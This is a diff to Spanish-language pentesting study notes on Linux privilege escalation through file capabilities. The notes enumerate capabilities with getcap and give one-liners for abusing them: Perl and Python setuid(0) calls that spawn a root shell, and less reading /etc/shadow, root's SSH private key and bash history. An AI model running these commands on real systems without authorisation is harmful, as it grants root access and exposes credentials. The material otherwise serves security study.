@@ -36,31 +36,51 @@ Cuando un archivo binario tiene el bit de ejecución elevado establecido, se pue
 
 Es importante señalar que los permisos permitidos pueden ser limitados aún más mediante el uso de un mecanismo de control de acceso obligatorio (MAC, Mandatory Access Control), como **SELinux** o **AppArmor**, que restringen las acciones que los procesos pueden realizar en función de la política de seguridad del sistema.
 
-
 # Capabilities 
 
 * [Gtfobins](https://gtfobins.github.io/#+capabilities)
 
-```bash
-❯ which getcap                             # Para ver si esta instalado el Getcap y mirar las capabilities
-❯ which setcap                             # Para setear las capabilities
 
-❯ getcap -r / 2>/dev/null                  # Listamos las capabilities que existan desde la raiz de forma recursiva y buscamos el comando aqui GTFOBins [GTFOBins]
+```bash 
+Tipo de capabilities 
+
+	- cap_setuid / setgid -> Cambias tu identidad (UID/GID)
+	- cap_dac_read_search -> Lees cualquier archivo 
+	- cap_dac_override -> Lees y escribes cualquier archivo 
+```
+
+```bash
+❯ which getcap                   # Mirar si esta instalado el Getcap y mirar las capabilities
+❯ which setcap                   # Setear las capabilities
+
+❯ getcap -r / 2>/dev/null        # Listar capabilities que existan desde la raiz
+
+# Más específico 
+❯ getcap -r / 2>/dev/null | grep -E 'cap_setuid|cap_setgid|cap_dac_override|cap_dac_read_arch|cap_sys_admin|cap_sys_ptrace|cap_module|cap_chown|cap_fowner'
 ```
 
 ## Perl 
 ```bash 
 Esta capabilitie nos permite gestionar el UID y hacer que opere como root
-	# /usr/bin/perl cap_setuid+ep 
+	# /usr/bin/perl  cap_setuid+ep 
 
 ❯ /usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
 # Controlar el identificador del usuario y colocar el setuid=0 para obtener una bash como root
 ```
-
 ## Python
 ```bash  
 Esta capabilitie nos permite gestionar el UID y hacer que opere como root
 	# /usr/bin/python3.10  cap_setuid+ep 
 
-❯ /usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("bash")'          # Controlar el identificador del usuario y colocar el setuid=0 para obtener una bash como root
+❯ /usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'         
+# Controlar el identificador del usuario y colocar el setuid=0 para obtener una bash como root
+```
+## Less
+```bash 
+Esta capabilitie nos permite leer cualquier archivo 
+	# /usr/bin/less  cap_dac_read_search+ep
+
+❯ /usr/bin/less /etc/shadow 
+❯ /usr/bin/less /root/.ssh/id_rsa 
+❯ /usr/bin/less /root/.bash_history
 ```
